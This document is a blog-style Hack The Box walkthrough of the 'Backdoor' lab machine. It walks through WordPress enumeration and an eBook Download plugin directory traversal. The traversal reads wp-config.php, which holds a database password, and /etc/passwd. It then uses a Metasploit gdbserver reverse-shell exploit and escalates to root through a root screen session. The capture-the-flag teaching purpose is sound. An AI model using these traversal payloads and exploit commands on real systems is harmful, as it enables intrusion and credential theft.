@@ -1,0 +1,442 @@
+---
+title: "HTB Walkthrough: Backdoor"
+date: 2022-04-21T20:54:30-04:00
+categories:
+  - HackTheBox
+tags:
+  - HTB
+  - Walkthrough
+  - Enumeration
+  - Easy
+---
+
+![Backdoor Logo](/assets/images/HTB/backdoor/backdoor.jpg)
+
+**Welcome** to this walkthrough for the [Hack The Box](https://www.hackthebox.com/) machine Backdoor. This one is listed as a 'easy' box and has also been retired, so access is only provided to those that have purchased VIP access to HTB.
+Because of this, you may notice that it is necessary to be connected to HTB's VIP VPN server, rather than the free server. To do this, change the dropdown selection in the top right corner where you select "Connect"
+to "VIP" and download the .ovpn package (yes, even as a paid user, you must toggle between free and paid VPN packages depending on the machine).
+
+---
+
+## Service/Application Enumeration
+
+I went ahead and started my NMap scan and then plugged the IP address into the browser to check for HTTP and HTTPS respectfully: **10.10.11.125:80** & **10.10.11.125:443**
+
+```bash
+sudo nmap -sS -A -sV -T4 -p- 10.10.11.125 | tee nmap_full.txt
+dirb http://10.10.11.125/ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | tee dirb.log
+nikto -h "http://10.10.11.125/" | tee nikto.log 
+```
+
+10.10.11.125:80 returned a blog-style webpage with a title "Backdoor Real Life"
+![Backdoor Landing Page (HTTP)](/assets/images/HTB/backdoor/homepage.jpg)
+
+Clicking through these nav-bar tabs I realize there is not much face-value content here, other than the **Home** page strangely redirects to an unavailable webpage: http://backdoor.htb/  
+So I used my view-source hotkey (CTRL+U) to check out some of the page's content. 
+
+![View-Source Content](/assets/images/HTB/backdoor/view-source.jpg)
+
+There is definitely a lot going on here:
+
+> Possible application/json POST requests
+> Possible Javascript exploits
+> Lots of public directories listed (/wp-content/) (/wp-includes/)
+> A WordPress version number: 5.8.1
+
+I intercepted a few requests in Burpsuite and also tried to inject different things into the browser.
+
+```bash
+# Just a few examples, among many with no success
+http://10.10.11.125/?id='
+http://10.10.11.125/?id="
+http://10.10.11.125/?id=0
+http://10.10.11.125/?id=1
+```
+
+But since this webapp appears to be powered by WordPress, I ran a search for exploits with its version number:
+
+![Searchsploit Results](/assets/images/HTB/backdoor/searchsploit1.jpg)
+
+To my knowledge, none of these plugins were running on the webpage (even so, after downloading the iThemes exploit, it states the vulnerability as being *authenticated* SQLi).
+
+So, I determine it was time to check out my scan results from earlier (NMap, Nikto, Dirb):
+
+![Scan Results](/assets/images/HTB/backdoor/scans.jpg)
+
+There is definitely a lot of information here, but I began my enumeration with the login pages that Dirb and Nikto discovered: **/wp-login.php** & **/wp-admin/**.  
+Navigating to the /wp-admin/ page redirects me to the /wp-login.php service:
+
+![Login Page](/assets/images/HTB/backdoor/login.jpg)
+
+Since this looks like a standard WordPress login page, I Google'd default credentials for WordPress admin and came across:
+
+> admin:password
+
+These did not work, however, and neither did **admin:admin**. So, before I start bruteforcing this user as a last option, I decided to check out some other attack vectors.  
+
+The /wp-content/uploads/ mentioned in the Nikto scan was empty, but had specific creation-date-related folders... Hmm...  
+The /wp-includes/ directory is very interesting too and allows me to view many files and folders, mostly PHP, to get a better idea of how the webapp is set up & its contents.  
+One way or another, I came across this page, which seems to be the WordPress JSON Rest API:
+
+> http://10.10.11.125/index.php/wp-json/
+
+This page is really useful because it lists the API's routes & namespaces:
+
+![/wp-json/](/assets/images/HTB/backdoor/wp-json.jpg)
+
+In fact, one of the routes takes us to a list of users for the WordPress site:
+
+![/wp-json/wp-v2/users/](/assets/images/HTB/backdoor/wp-users.jpg)
+
+You can see in the image above, there is only one user, "admin" and the user's ID is "1".  
+
+I did a lot of hunting with this box, mostly because the vulnerabilities/enumeration are very specific to WordPress, which you will find out. However, there is a great tool for us to use here that took me too long to find.  
+It is called WP-Scan and can be installed on linux with:
+
+```bash
+sudo apt get install wpscan
+
+# There are many different variables you can provide, but here is the scan that I performed:
+wpscan --url 10.10.11.125 --plugins-detection aggressive -e p,u | tee wpscan.log
+```
+
+### WPScan Output:
+```bash	
+Interesting Finding(s):
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.11.125/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
+ |  - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
+ | Last Updated: 2022-01-25T00:00:00.000Z
+ | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.8 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'
+
+[+] Enumerating Most Popular Plugins (via Aggressive Methods)
+
+ Checking Known Locations -: |=====================================================================================|
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://10.10.11.125/wp-content/plugins/akismet/
+ | Latest Version: 4.2.2
+ | Last Updated: 2022-01-24T16:11:00.000Z
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.10.11.125/wp-content/plugins/akismet/, status: 403
+ |
+ | The version could not be determined.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+
+ Brute Forcing Author IDs -: |=====================================================================================|
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+```
+
+## Local File Inclusion / Directory Traversal
+
+Since plugins seem to be a huge deal concerning WordPress vulnerability, I started looking into those. The Akismet link that WPScan provided was broken, so I went to the /wp-content/plugins/ directory to *root* around.  
+I found a plugin named "ebook-download" that contained PHP files named 'ebookdownload.php' and 'filedownload.php'. Hmm...  
+Searching "ebook" in searchsploit via:
+
+```bash
+searchsploit ebook
+```
+I found the following exploit for an eBook plugin directory traversal:
+
+![eBook Plugin Exploit Search](/assets/images/HTB/backdoor/ebook.jpg)
+
+Let's download it.  
+
+```
+# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
+# Exploit Author: Wadeek
+# Website Author: https://github.com/Wad-Deek
+# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
+# Version: 1.1
+# Tested on: Xampp on Windows7
+
+[Version Disclosure]
+======================================
+http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
+======================================
+
+[PoC]
+======================================
+/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+======================================
+```
+
+Okay, seems simple enough. Let's test it on Backdoor.  
+After navigating to *backdoor-IP-address*/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php, I receive a prompt to download wp-config.php... Woohoo!
+
+### **WP-Config.php Contents**
+
+```bash
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the web site, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpressuser' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+
+/* That's all, stop editing! Happy blogging. */
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+define('ABSPATH', dirname(__FILE__) . '/');
+/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */
+$currenthost = "http://".$_SERVER['HTTP_HOST'];
+$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));
+$currentpath = preg_replace('/\/wp.+/','',$currentpath);
+define('WP_HOME',$currenthost.$currentpath);
+define('WP_SITEURL',$currenthost.$currentpath);
+define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content');
+define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins');
+define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath );
+@define('ADMIN_COOKIE_PATH', './');
+
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+```
+
+Okay, so there are some credentials here. However, I tried them in every place I could imagine with no luck:
+
+> MySQL  
+> SSH  
+> /wp-login/ Portal  
+
+THAT'S OKAY. After this, I attempted to grab /etc/passwd via the same Local File Inclusion but had trouble. After a couple attempts, I discovered that you need a *minimum* of six parent-directory moves (../)  
+Here is the directory traversal to download the sensitive /etc/passwd file:
+
+> 10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd
+
+[Here](https://pentestlab.blog/2012/06/29/directory-traversal-cheat-sheet/) is a link to a directory traversal cheatsheet that has proven to be very helpful if you don't know what to look for.
+
+Anyways, this is way easier to automate, so let's do that with Burpsuite:
+
+> 1. Use Foxy Proxy or other proxy to intercept LFI attempt and then send it to Burpsuite's Intruder tab.  
+> 2. Open Intruder tab and set Target to: 10.10.11.125 Port: 80  
+> 3. On the Positions tab, set Attack Type to Battering Ram; Use the *Add $* button to add two $'s after your link's sixth "../" (This tells Burp to put a payload between these $payload_here!$)  
+> 4. On the Payloads tab, click Load next to Payloads Options and select a list to brute force with (I chose: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)  
+> 5. Click *Start Attack*  
+> 6. This will create a new Burp window that allows you to review the results for each payload, i.e., each file that is being requested.  
+
+![Burpsuite Step1 Intruder](/assets/images/HTB/backdoor/burp1-1.jpg)
+![Burpsuite Step2 Intruder](/assets/images/HTB/backdoor/burp1-2.jpg)
+![Burpsuite Step3 Intruder](/assets/images/HTB/backdoor/burp1-3.jpg)
+
+Even though I found quite a bit of sensitive information from these attacks, I did not gain any additional privilege this way.
+
+It all comes down to your knowledge and attempt to exploit the /proc/ filesystem. [Here](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/) is a good resource to read up on.  
+I will just cut to the chase at this point. In our traversal, and providing payloads via Burpsuite, we can use /proc/[PID]/cmdline to get more information about processes running.
+
+![Burpsuite Using Number Iterator Payload](/assets/images/HTB/backdoor/burp2-1.jpg)
+![Burpsuite Using Number Iterator Payload](/assets/images/HTB/backdoor/burp2-2.jpg)
+
+## EXPLOIT IT
+
+Eventually, you find that gdb is running on port 1337 via a certain /proc/PID/cmdline return and there are some shotty hit/miss online exploits to abuse this. There is one in metasploit if you search *gdb* or there is a manual one [here](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver).  
+I went the Metasploit route, here are the commands for kali linux:
+
+```bash
+msfconsole
+search gdb
+use 0
+show options
+set rhosts 10.10.11.125
+set rport 1337
+set lhost tun0
+set target 1
+show payloads # This will show you all available payloads, staged and unstaged. Normally I just try every reverse shell option until one of them works. 
+set payload 18
+run #(or type *exploit* to look really cool)
+```
+Read more about payloads from OffSec reguarding Metasploit [here](https://www.offensive-security.com/metasploit-unleashed/payload-types/).
+
+![Metasploit Exploit Setup](/assets/images/HTB/backdoor/msf-setup.jpg)
+
+If you gain a shell, congrats, just cat-out the user.txt file:
+
+![User Flag](/assets/images/HTB/backdoor/user.jpg)
+
+If you did not gain a shell, check your options/change payload/restart the box.  
+Pressing on, while trying to manuever the box, you may be told that certain commands must be run from a terminal. In any case, if commands aren't firing properly, I try to spawn a tty shell to fix that issue. Cheatsheet [here](https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html).  
+
+95% of the time, I just have to figure out which version of Python is installed for me to spawn the shell. You can check by typing the different version commands out and seeing if you get a hit:
+
+![Checking Python Version/Spawning TTY Shell](/assets/images/HTB/backdoor/spawn-shell.jpg)
+
+In the above image, you can also see that I used this command:
+
+```bash
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/qwerty.py
+python3 /tmp/qwerty.py
+```
+This is a one-liner that echoes python script to spawn a command shell into a file named *qwerty.py*.  
+The name of the file does not matter, but I purposefully put it in /tmp/ because we are likely to have privileges to *execute* the file from this directory.  
+Also, you have to use an *installed* version of Python to run it, i.e. Python3 here.  
+Now we have a TTY shell.  
+
+Find a way to get linpeas.sh onto the filesystem and execute it. Curl works well for this (either from Github or your own IP if you host it in /var/www/html with apache2):
+
+![Curling Down LinPeas](/assets/images/HTB/backdoor/peas.jpg)
+
+Long story short, yellow bg + red text is a 95% privilege escalation vector, and this is the one we are going to use:
+
+![LinPeas Found a PrivEsc Vector!](/assets/images/HTB/backdoor/pe-vector.jpg)
+  
+After checking out processes (ps -eF) and looking at cronjobs, and Googling.... lots of Googling, you will eventually learn that you need to set the terminal type to xterm and change screen like this:
+
+```bash
+export TERM=xterm
+$TERM # to check it
+screen -x root/root
+```
+
+![Root Flag](/assets/images/HTB/backdoor/root.jpg)
+
+Thank you for checking out this walkthrough.
+
+
